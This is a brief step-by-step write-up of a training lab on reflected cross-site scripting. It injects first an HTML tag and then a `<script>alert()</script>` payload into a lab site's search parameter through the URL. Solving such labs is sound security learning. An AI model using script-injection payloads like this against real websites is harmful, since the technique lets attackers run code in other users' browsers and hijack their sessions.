# Reflected XSS into HTML context with nothing encoded

## This lab contains a simple [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality.

## To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

---

### step 1

`https://0a7b000c0436edbdc665d52c000100ef.web-security-academy.net/?search=market`

you will get search result

### step2

heree test `<p> hello</p>`

`https://0a7b000c0436edbdc665d52c000100ef.web-security-academy.net/?search=<p>hello</p>`

you will get hello on browser
now
`https://0a7b000c0436edbdc665d52c000100ef.web-security-academy.net/?search=<script>alert()</script>`
`
alert function will pop up window on screen
